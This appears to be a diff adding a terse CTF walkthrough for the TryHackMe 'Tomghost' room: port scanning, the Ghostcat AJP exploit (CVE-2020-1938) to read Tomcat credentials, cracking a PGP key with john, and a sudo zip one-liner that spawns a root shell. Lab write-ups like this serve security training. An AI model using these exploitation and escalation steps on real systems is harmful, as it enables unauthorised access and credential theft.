@@ -1,0 +1,85 @@
+----------------                               ------------------
+               :::::::::::;| TOMGHOST |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "TOMGHOST".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 4 ports (22/SSH, 53/DNS, 8009/AJP, 8080/HTTP).
+
+3. What's running on 8080?
+ANS: Apache Tomcat 9.0.30.
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (EXPLOIT)
+
+1. CHECK AJP PORT.
+
+    searchsploit ajp
+    "Use Ghostcat exploit (CVE-2020-1938)"
+
+    python2 exploit.py <ip>
+    "GOT /WEB-INF/web.xml with creds: skyfuck:8730281lkjlkjdqlksalks"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. SSH ACCESS.
+
+    ssh skyfuck@<ip>
+    Password: 8730281lkjlkjdqlksalks
+    "WE'RE IN!"
+
+2. CHECK FILES.
+
+    ls -la
+    "FOUND credential.pgp and tryhackme.asc"
+
+3. CRACK PGP.
+
+    gpg2john tryhackme.asc > hash
+    john hash --wordlist=rockyou.txt
+    "Password: alexandru"
+
+    gpg --import tryhackme.asc
+    gpg --decrypt credential.pgp
+    "GOT merlin password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (ROOT ESCALATION)
+
+1. SU TO MERLIN.
+
+    su merlin
+    Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+2. CHECK SUDO.
+
+    sudo -l
+    "Can run /usr/bin/zip as root!"
+
+    TF=$(mktemp -u)
+    sudo zip $TF /etc/hosts -T -TT 'sh #'
+    "BOOM! ROOT SHELL!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/merlin/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- TOMGHOST PWNED ----------
